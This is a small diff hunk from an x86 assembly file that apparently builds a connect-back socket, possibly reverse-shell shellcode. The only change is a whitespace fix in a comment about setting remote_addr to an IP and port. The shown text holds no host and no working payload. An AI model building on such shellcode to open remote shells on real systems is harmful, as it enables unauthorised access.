@@ -28,7 +28,7 @@ _start:
 	; struct sockaddr:
 	; - remote_addr.sin_family = AF_INET;
  	; - remote_addr.sin_port = htons(PORT);
-  ; - remote_addr.sin_addr.s_addr = inet_addr(IP);
+  	; - remote_addr.sin_addr.s_addr = inet_addr(IP);
 	; sizeof = 0x10 (16)
 
 	mov esi, eax 	      ; File descriptor for the new socket returned from last syscall (create socket)
